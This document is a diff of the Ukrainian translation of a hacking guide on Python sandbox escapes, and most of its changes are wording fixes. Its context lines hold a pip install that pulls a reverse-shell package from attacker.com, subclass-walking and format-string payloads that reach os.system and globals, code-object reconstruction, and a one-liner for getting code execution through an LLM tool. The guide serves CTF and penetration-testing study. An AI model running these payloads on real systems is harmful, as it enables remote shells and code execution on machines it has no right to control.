@@ -41,8 +41,7 @@ system('ls')
 ```
 Пам'ятайте, що функції _**open**_ та _**read**_ можуть бути корисними для **читання файлів** всередині пісочниці python та для **написання коду**, який ви могли б **виконати** для **обходу** пісочниці.
 
-> [!CAUTION]
-> Функція **Python2 input()** дозволяє виконувати код python перед тим, як програма зламається.
+> [!CAUTION] > Функція **Python2 input()** дозволяє виконувати код python до того, як програма зламається.
 
 Python намагається **завантажити бібліотеки з поточної директорії спочатку** (наступна команда виведе, звідки python завантажує модулі): `python3 -c 'import sys; print(sys.path)'`
 
@@ -80,10 +79,12 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
 Ви можете завантажити пакет для створення зворотного шеллу тут. Будь ласка, зверніть увагу, що перед використанням ви повинні **розпакувати його, змінити `setup.py` і вказати свою IP-адресу для зворотного шеллу**:
 
-{% file src="../../../images/Reverse.tar (1).gz" %}
+{{#file}}
+Reverse.tar (1).gz
+{{#endfile}}
 
 > [!NOTE]
-> Цей пакет називається `Reverse`. Однак він був спеціально створений так, що коли ви виходите із зворотного шеллу, решта установки зазнає невдачі, тому ви **не залишите жодного додаткового python пакету встановленим на сервері**, коли ви підете.
+> Цей пакет називається `Reverse`. Однак він був спеціально створений так, що коли ви виходите із зворотного шеллу, решта установки зазнає невдачі, тому ви **не залишите жодного додаткового python пакету встановленим на сервері** після виходу.
 
 ## Eval-ing python code
 
@@ -292,7 +293,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Прочитайте файл з допомогою вбудованих функцій та ліцензії
+### Прочитайте файл з допомогою builtins та ліцензії
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -313,7 +314,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-Коли у вас немає `__builtins__`, ви не зможете імпортувати нічого, навіть читати або записувати файли, оскільки **всі глобальні функції** (як-от `open`, `import`, `print`...) **не завантажені**.\
+Коли у вас немає `__builtins__`, ви не зможете імпортувати нічого, навіть читати чи записувати файли, оскільки **всі глобальні функції** (як-от `open`, `import`, `print`...) **не завантажені**.\
 Однак, **за замовчуванням python імпортує багато модулів в пам'ять**. Ці модулі можуть здаватися безпечними, але деякі з них **також імпортують небезпечні** функціональності всередині, до яких можна отримати доступ для отримання навіть **випадкового виконання коду**.
 
 У наступних прикладах ви можете спостерігати, як **зловживати** деякими з цих "**безпечних**" модулів, щоб **отримати доступ** до **небезпечних** **функціональностей** всередині них.
@@ -358,7 +359,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Нижче наведена більша функція**](#recursive-search-of-builtins-globals) для знаходження десятків/**сотень** **місць**, де ви можете знайти **builtins**.
+[**Нижче наведена більша функція**](#recursive-search-of-builtins-globals) для знаходження десятків/**сотень** **місць**, де ви можете знайти **вбудовані функції**.
 
 #### Python2 та Python3
 ```python
@@ -534,7 +535,7 @@ execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 """
 ```
-## Рекурсивний пошук Builtins, Globals...
+## Рекурсивний пошук вбудованих, глобальних...
 
 > [!WARNING]
 > Це просто **чудово**. Якщо ви **шукаєте об'єкт, наприклад globals, builtins, open або будь-що інше**, просто використовуйте цей скрипт, щоб **рекурсивно знайти місця, де ви можете знайти цей об'єкт.**
@@ -659,9 +660,9 @@ main()
 https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
 {{#endref}}
 
-## Python Форматний рядок
+## Python Format String
 
-Якщо ви **надсилаєте** **рядок** до python, який буде **форматуватися**, ви можете використовувати `{}` для доступу до **внутрішньої інформації python.** Ви можете використовувати попередні приклади для доступу до глобальних або вбудованих функцій, наприклад.
+Якщо ви **надсилаєте** **рядок** до python, який буде **форматуватися**, ви можете використовувати `{}` для доступу до **внутрішньої інформації python.** Ви можете використовувати попередні приклади для доступу до globals або builtins, наприклад.
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -681,7 +682,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Зверніть увагу, як ви можете **отримати доступ до атрибутів** звичайним способом з **крапкою** як `people_obj.__init__` і **елементу dict** з **дужками** без лапок `__globals__[CONFIG]`
+Зверніть увагу, як ви можете **отримувати доступ до атрибутів** звичайним способом з **крапкою** як `people_obj.__init__` і **елементу dict** з **дужками** без лапок `__globals__[CONFIG]`
 
 Також зверніть увагу, що ви можете використовувати `.__dict__` для перерахування елементів об'єкта `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -690,7 +691,7 @@ get_name_for_avatar(st, people_obj = people)
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Крім того, можливо **створювати нові форматори** в класах:
+Крім того, можливо **створювати нові форматери** в класах:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -704,7 +705,7 @@ return 'HAL 9000'
 **Більше прикладів** про **формат** **рядків** можна знайти за посиланням [**https://pyformat.info/**](https://pyformat.info)
 
 > [!УВАГА]
-> Перевірте також наступну сторінку на наявність гаджетів, які можуть **читати чутливу інформацію з внутрішніх об'єктів Python**:
+> Перевірте також наступну сторінку на наявність гаджетів, які можуть r**ead sensitive information from Python internal objects**:
 
 {{#ref}}
 ../python-internal-read-gadgets.md
@@ -726,7 +727,7 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### LLM Jails bypass
+### LLM Jails обход
 
 З [тут](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
@@ -736,7 +737,7 @@ str(x) # Out: clueless
 
 Нагадаємо, що кожного разу, коли виконується дія в python, виконується якась функція. Наприклад, `2*3` виконає **`(2).mul(3)`** або **`{'a':'b'}['a']`** буде **`{'a':'b'}.__getitem__('a')`**.
 
-Ви можете знайти більше подібного в розділі [**Python execution without calls**](#python-execution-without-calls).
+Ви можете знайти більше подібного в розділі [**Виконання Python без викликів**](#python-execution-without-calls).
 
 Вразливість форматного рядка python не дозволяє виконувати функцію (вона не дозволяє використовувати дужки), тому неможливо отримати RCE, як `'{0.system("/bin/sh")}'.format(os)`.\
 Однак, можливо використовувати `[]`. Тому, якщо у звичайній бібліотеці python є метод **`__getitem__`** або **`__getattr__**, який виконує довільний код, їх можна зловживати для отримання RCE.
@@ -774,7 +775,7 @@ pydll = LibraryLoader(PyDLL)
 > [!NOTE]
 > Якщо ви хочете **вивчити** **байт-код Python** детально, прочитайте цей **чудовий** пост на цю тему: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-У деяких CTF вам можуть надати назву **кастомної функції, де знаходиться прапор**, і вам потрібно буде переглянути **внутрішню** частину **функції**, щоб витягти його.
+У деяких CTF вам можуть надати назву **кастомної функції, де знаходиться прапор**, і вам потрібно буде переглянути **внутрішню структуру** **функції**, щоб витягти його.
 
 Це функція для перевірки:
 ```python
@@ -922,7 +923,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Компіляція Python
 
 Тепер уявімо, що якимось чином ви можете **вивантажити інформацію про функцію, яку ви не можете виконати**, але вам **потрібно** її **виконати**.\
-Як у наступному прикладі, ви **можете отримати доступ до об'єкта коду** цієї функції, але просто читаючи disassemble ви **не знаєте, як обчислити прапорець** (_уявіть більш складну функцію `calc_flag`_)
+Як у наступному прикладі, ви **можете отримати доступ до об'єкта коду** цієї функції, але просто читаючи disassemble, ви **не знаєте, як обчислити прапорець** (_уявіть більш складну функцію `calc_flag`_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -965,10 +966,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 > 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
-### Відтворення витоку функції
+### Відтворення вкраденої функції
 
 > [!WARNING]
-> У наступному прикладі ми будемо брати всі дані, необхідні для відтворення функції, безпосередньо з об'єкта коду функції. У **реальному прикладі** всі **значення**, необхідні для виконання функції **`code_type`**, це те, що **вам потрібно буде витягти**.
+> У наступному прикладі ми будемо використовувати всі дані, необхідні для відтворення функції, безпосередньо з об'єкта коду функції. У **реальному прикладі** всі **значення**, необхідні для виконання функції **`code_type`**, це те, що **вам потрібно буде вкрасти**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -981,10 +982,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-In previous examples at the beginning of this post, you can see **як виконати будь-який python код, використовуючи функцію `compile`**. This is interesting because you can **виконати цілі скрипти** with loops and everything in a **one liner** (and we could do the same using **`exec`**).\
-Anyway, sometimes it could be useful to **створити** a **скомпільований об'єкт** in a local machine and execute it in the **CTF machine** (for example because we don't have the `compiled` function in the CTF).
+У попередніх прикладах на початку цього посту ви можете побачити **як виконати будь-який python код, використовуючи функцію `compile`**. Це цікаво, оскільки ви можете **виконувати цілі скрипти** з циклами і всім іншим в **одному рядку** (і ми могли б зробити те ж саме, використовуючи **`exec`**).\
+У будь-якому випадку, іноді може бути корисно **створити** **скомпільований об'єкт** на локальному комп'ютері та виконати його на **CTF машині** (наприклад, тому що у нас немає функції `compiled` в CTF).
 
-For example, let's compile and execute manually a function that reads _./poc.py_:
+Наприклад, давайте скомпілюємо та виконаємо вручну функцію, яка читає _./poc.py_:
 ```python
 #Locally
 def read():
@@ -1011,7 +1012,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Якщо ви не можете отримати доступ до `eval` або `exec`, ви можете створити **належну функцію**, але прямий виклик зазвичай завершиться невдачею з повідомленням: _конструктор недоступний у обмеженому режимі_. Тому вам потрібна **функція, яка не знаходиться в обмеженому середовищі, щоб викликати цю функцію.**
+Якщо ви не можете отримати доступ до `eval` або `exec`, ви можете створити **правильну функцію**, але прямий виклик зазвичай завершиться невдачею з повідомленням: _конструктор недоступний у обмеженому режимі_. Тому вам потрібна **функція, яка не знаходиться в обмеженому середовищі, щоб викликати цю функцію.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1033,7 +1034,7 @@ f(42)
 
 ### Assert
 
-Python, виконаний з оптимізаціями з параметром `-O`, видалить оператори assert та будь-який код, що залежить від значення **debug**.\
+Python, виконуваний з оптимізаціями з параметром `-O`, видалить оператори assert та будь-який код, що залежить від значення **debug**.\
 Отже, перевірки, такі як
 ```python
 def check_permission(super_user):
@@ -1053,6 +1054,5 @@ print(f"\nNot a Super User!!!\n")
 - [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
-
 
 {{#include ../../../banners/hacktricks-training.md}}
